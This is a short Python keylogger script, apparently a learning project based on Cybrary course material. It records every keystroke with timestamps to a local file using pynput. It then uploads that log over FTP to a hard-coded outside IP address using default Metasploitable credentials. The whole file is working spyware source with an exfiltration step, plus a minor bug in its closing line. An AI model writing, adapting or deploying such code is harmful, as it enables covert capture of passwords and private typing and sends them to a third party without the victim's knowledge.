# -*- coding: utf-8 -*-
"""
Spyder Editor

This is a temporary script file.
"""
#I performed this project thanks to the content of Cybrary. I've configured the logging to save key events with time stamped into a text file. 
#I defined a pressing key function to output key press events into the logging.
#I listened to key events. 
#I also called the functionality that's going to send our output file to an FTP server of our choice.

from pynput.keyboard import Key, Listener
import ftplib 
import logging

logdir= ""
logging.basicConfig(filename=(logdir+"klog-res.txt"), level=logging.DEBUG,format="%(asctime)s:%(message)s")

def pressing_key(Key):
    try:
        logging.info(str(Key))
    except AttributeError:
        print("A special key {0} has been pressed.".format(Key))

def releasing_key(Key):
    if Key==Key.esc:
        return False

print("\nStarted listening...\n")

with Listener(on_press=pressing_key, on_release=releasing_key) as Listener:
    Listener.join()

print("\nConnection to  the FTP and sending the data...")

sess=ftplib.FTP("172.217.17.238","msfadmin","msfadmin")
file=open("klog-res.txt","rb")
sess.storbinary("STOR klog-res.txt",file)

file.close()
file.quit()



